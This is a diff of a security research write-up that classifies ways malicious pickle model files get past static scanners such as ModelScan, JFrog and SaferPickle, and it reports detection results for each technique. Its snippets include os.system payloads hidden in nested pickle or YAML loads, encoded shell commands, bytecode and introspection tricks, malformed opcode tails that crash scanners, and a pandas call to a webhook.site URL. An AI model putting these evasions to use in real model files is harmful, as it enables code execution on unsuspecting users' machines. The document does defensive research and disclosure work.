@@ -1,8 +1,10 @@
+# A Taxonomy of Static-Scanner Evasion Techniques
+
 We systematically categorized static scanner evasion techniques by method. This survey was conducted as of February 25, 2026. The target scanners are Protect AI, JFrog, and ClamAV on Hugging Face, as well as the open-source SaferPickle and ModelScan. The open-source scanners used were the latest versions available at that time: ModelScan 0.8.8 and SaferPickle (commit 88564e07dbefff58d1bc7571cce01accd394b102). Allowlist-based scanners (fickling and HF PickleScan) are excluded, and VirusTotal is also excluded due to its extremely low detection rate.
 
-The Python code shown in this section is decompiled from pickle files (or pickle files inside zip archives) with [fickling](https://github.com/trailofbits/fickling).
+The Python code shown in this section is decompiled from pickle files (or pickle files inside zip archives) with fickling.
 
-# Overview
+## Overview
 
 The table below summarizes each evasion technique's novelty and per-scanner detection result. "Concept known" means the high-level concept appears in prior work, but the specific techniques listed below are new. "Known" means the technique itself was previously documented (see inline references in each section). "D" (Detected) means the scanner flags the sample. "E" (Evaded) means it does not. "P (X/8)" (Partial) appears only for the Obfuscation row, indicating X out of 8 samples were flagged.
 
@@ -34,7 +36,7 @@ Note that the novelty assessment in this section is based on publicly available 
 
 What emerges from this detailed survey is the inherent limitation of static-scanner pattern matching. Even when an evasion technique is conceptually known, no scanner covers every concrete variant. Moreover, even fully known techniques previously published in prior work are still missed by multiple scanners.
 
-# Alternative Execution Primitives
+## Alternative Execution Primitives
 
 Attackers simply use alternative methods to evade denylisted function calls.
 For example, calling different methods rather than `os.system` or `subprocess.run` for command execution. This is a known technique; similar alternative functions are referred to as "attack gadgets" in prior [research](https://arxiv.org/abs/2508.19774) by Liu et al.
@@ -63,7 +65,7 @@ _var0 = read_csv('https://webhook.site/d8bacf61-b843-4a4b-bf92-cc0cde71962e?pwne
 
 Alternative Execution Primitives is deceptively simple yet highly evasive. In fact, the three command execution examples above evade all evaluated scanners (the external-communication case evades all scanners except Protect AI). The set of evaded scanners varies depending on which package is used as the alternative primitive.
 
-## Nested Deserialization Variant
+### Nested Deserialization Variant
 
 The malicious payload is embedded inside the argument of a deserialization function call. Scanners only inspect pickle-level globals and do not recursively parse the nested payload.
 
@@ -84,11 +86,11 @@ _var0 = _load_from_bytes(b"\x80\x04cbuiltins\nexec\n(\x8c\x19import os;os.system
 
 YAML unsafe deserialization is a well-known security issue. The PyYAML [documentation](https://pyyaml.org/wiki/PyYAMLDocumentation) itself notes that `yaml.load` is as powerful as `pickle.load` and can call any Python function. However, we have not found public references for the evasion technique that exploits pickle-based model scanners' failure to recursively parse nested YAML payloads or second-stage pickle payloads, particularly the `torch.storage._load_from_bytes` variant.
 
-# Scanner-side Parsing Path Exceptions
+## Scanner-side Parsing Path Exceptions
 
 Attackers craft code that causes exceptions in the static scanner's logic to bypass detection.
 
-## `zipfile` Exceptions
+### `zipfile` Exceptions
 
 Prior [research](https://arxiv.org/abs/2508.19774) by Liu et al. has shown that PyTorch's custom Zip extractor differs from the standard `ZipFile` library used by static scanners. A crafted model can exploit this gap to crash the scanner via `zipfile` exceptions while PyTorch loads it normally. The following output is from running SaferPickle against such a crafted model:
 
@@ -109,7 +111,7 @@ zipfile.BadZipFile: File name in directory 'does_not_scan_but_opens_in_torch/dat
 
 SaferPickle, ModelScan, and JFrog are all vulnerable to this technique.
 
-## `pickletools` Exceptions
+### `pickletools` Exceptions
 
 Appending a truncated opcode (e.g., `BINUNICODE` 0x58 without its required 4-byte length prefix) after the malicious payload causes a `ValueError` in the `pickletools` module. The `pickle` module executes opcodes sequentially, so the payload runs at `REDUCE` before the corrupted tail is ever reached.
 
@@ -127,11 +129,11 @@ Appending a truncated opcode (e.g., `BINUNICODE` 0x58 without its required 4-byt
 
 This technique was first reported by [ReversingLabs](https://www.reversinglabs.com/blog/rl-identifies-malware-ml-model-hosted-on-hugging-face) as an evasion against Picklescan, which has since been patched. However, it still evades ModelScan and SaferPickle.
 
-## Scanner-Specific Exceptions
+### Scanner-Specific Exceptions
 
 These samples do not corrupt the opcode stream itself. Instead, they append deliberately malformed operands after the malicious `GLOBAL` + `REDUCE` payload, triggering unhandled exceptions in the scanners' own `STACK_GLOBAL` resolution logic. The payload executes at `REDUCE` before the malformed tail is ever reached by the pickle runtime.
 
-### Invalid Memo Reference
+#### Invalid Memo Reference
 
 `BINGET 3` references a memo key that was never stored. Scanners that resolve memo references internally raise `KeyError`. This technique evades JFrog and ModelScan.
 
@@ -151,7 +153,7 @@ These samples do not corrupt the opcode stream itself. Instead, they append deli
   58: 2e STOP
 ```
 
-### Type-Confused Stack Operands
+#### Type-Confused Stack Operands
 
 Pushing a non-string type onto the stack as a `STACK_GLOBAL` operand causes `TypeError` when the scanner performs string operations on the module name. This technique has variants using `bytes`, `int`, and other types. The `bytes` variant evades JFrog, ClamAV, and ModelScan; the `int` variant evades JFrog and ModelScan.
 
@@ -190,7 +192,7 @@ Pushing a non-string type onto the stack as a `STACK_GLOBAL` operand causes `Typ
   66: 2e STOP
 ```
 
-### Unhashable Type on Stack
+#### Unhashable Type on Stack
 
 `BYTEARRAY8` pushes `bytearray(b'system')` onto the stack. Since `bytearray` is mutable and unhashable, scanners that collect globals into a `set` raise `TypeError: unhashable type: 'bytearray'`. This technique evades JFrog and ModelScan.
 
@@ -211,7 +213,7 @@ Pushing a non-string type onto the stack as a `STACK_GLOBAL` operand causes `Typ
   86: 2e STOP
 ```
 
-# Obfuscation
+## Obfuscation
 
 Attackers obfuscate their code to evade denylist string pattern matching. Obfuscation and encoding techniques for scanner evasion were previously documented by [Trail of Bits](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-2/).
 
@@ -232,7 +234,7 @@ _var1 = unsafe_load('!!python/object/new:os.system \nargs: [echo ZiA9IG9wZW4oImx
 
 We identified eight obfuscated malicious model files during evaluation. While these samples included obviously unsafe primitives such as `os.system` and `subprocess`, only a few out of eight were explicitly labeled as `unsafe` by each scanner: Protect AI (2), JFrog (3), ClamAV (1), SaferPickle (2), and ModelScan (3).
 
-# Pickle’s Python 2 Compatibility Mapping
+## Pickle’s Python 2 Compatibility Mapping
 
 Attackers specify `commands` in the pickle file's `GLOBAL` opcode instead of the more easily detected `subprocess`.
 
@@ -245,7 +247,7 @@ In `Unpickler.find_class`, if `protocol` < 3 and `fix_imports` is `True`, the pi
 
 This evasion technique is effective against all scanners except SaferPickle.
 
-# CodeType/FunctionType Construction
+## CodeType/FunctionType Construction
 
 This technique constructs a code object with attacker-controlled bytecode using `CodeType`, wraps it into a callable via `FunctionType`, and immediately invokes it. The malicious logic is embedded in raw bytecode, avoiding commonly flagged patterns such as direct `os.system` or `exec` calls.
 In the basic form, both types are imported directly from the types module. This evades all scanners except SaferPickle.
@@ -257,7 +259,7 @@ _var0 = CodeType(0, 0, 0, 1, 3, 67, b'd\x01d\x00l\x00}\x00|\x00\xa0\x01d\x02\xa1
 _var1 = FunctionType(_var0, {})
 ```
 
-## Indirect Variant
+### Indirect Variant
 
 A more evasive form avoids importing `CodeType`/`FunctionType` by name, instead obtaining them via runtime introspection on an arbitrary function:
 
@@ -275,7 +277,7 @@ _var5 = _var0(_var4, {})
 
 Any regular Python function can serve as the donor; `copy.copy` is used here, but the choice is arbitrary. This evades static scanners that rely on detecting `from types import CodeType/FunctionType` as a signature. SaferPickle still detects this variant, but downgrades the result from `unsafe` to `suspicious`.
 
-## Marshal Variant
+### Marshal Variant
 
 Instead of constructing a code object directly with `CodeType`, this variant uses `marshal.loads` to deserialize a pre-built code object from raw bytes. The malicious bytecode is opaque to scanners since it is embedded in the serialized blob rather than appearing as explicit `CodeType` arguments. This variant was originally documented by [Trail of Bits](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-2/) and still evades Protect AI, JFrog, and ModelScan.
 
@@ -287,11 +289,11 @@ _var1 = FunctionType(_var0, {})
 _var2 = _var1()
 ```
 
-# Uncommon Opcodes
+## Uncommon Opcodes
 
 Attackers can evade static scanners by using pickle opcodes that are rarely seen in legitimate models and therefore not implemented or inspected by scanners.
 
-## `EXT2` Opcode with `copyreg.add_extension`
+### `EXT2` Opcode with `copyreg.add_extension`
 
 This technique exploits the pickle extension registry mechanism to invoke a dangerous function indirectly, without any of the opcodes that scanners typically monitor.
 
@@ -316,7 +318,7 @@ support for Opcode EXT2`.
 
 This evasion technique is effective against all scanners except SaferPickle.
 
-## `INST` Opcode with Memo Indirection
+### `INST` Opcode with Memo Indirection
 
 This technique uses the `INST` opcode — an old protocol 0 instruction rarely seen in modern pickle files — to dynamically construct the target module name and pass it to
 `STACK_GLOBAL` through the memo, bypassing pattern-based detection.
@@ -343,7 +345,7 @@ from associating the module name `os` with the `STACK_GLOBAL` opcode.
 
 This evasion technique is effective against all scanners except SaferPickle.
 
-# Python Introspection Chain
+## Python Introspection Chain
 
 This technique exploits Python's introspection — the ability to inspect object attributes, types, and class hierarchies at runtime — to reach dangerous functions from safe
 starting points, without importing any blocked module.
@@ -390,7 +392,7 @@ The general introspection chain reaching `eval` through `__subclasses__` / `__bu
 
 This evasion technique is effective against all scanners except SaferPickle.
 
-# Indirect Model Loading
+## Indirect Model Loading
 
 One downloader sample attempted to load another malicious model from the Hugging Face Hub, although that model is currently unavailable. While Hub downloads are common in normal inference or training code, they are unusual during model loading.
 
@@ -403,11 +405,11 @@ _var1 = _var0('zpbrent/reuse')
 
 This evasion technique was [introduced](https://jfrog.com/blog/jfrog-and-hugging-face-join-forces/) by JFrog but is still effective against all scanners except Protect AI and JFrog.
 
-# File Extension and Format Mismatch
+## File Extension and Format Mismatch
 
 A raw pickle file with a PyTorch-associated extension (`.bin`, `.pt`, `.pth`, `.ckpt`) exploits extension-based scanner routing. ModelScan maps these extensions to `PyTorchUnsafeOpScan`, which expects a ZIP archive with the PyTorch magic number. Since a raw pickle file lacks this magic number, the scanner skips the file as invalid without falling back to the plain pickle scanner. `torch.load()` accepts both ZIP archives and raw pickle files, so the payload executes normally. The same class of issue was previously reported in picklescan as [GHSA-jgw4-cr84-mqxg](https://github.com/mmaitre314/picklescan/security/advisories/GHSA-jgw4-cr84-mqxg). This technique evades JFrog and ModelScan.
 
-# Old Format
+## Old Format
 
 Attackers can evade detection by packaging malicious pickle code in legacy model file formats. For example, PyTorch originally used the TAR archive format before switching to ZIP-based archives by default in v1.6. While `torch.load()` transparently handles both formats, some scanners such as ModelScan and JFrog cannot analyze pickle files inside TAR archives. ModelScan's source code explicitly acknowledges this gap:
 
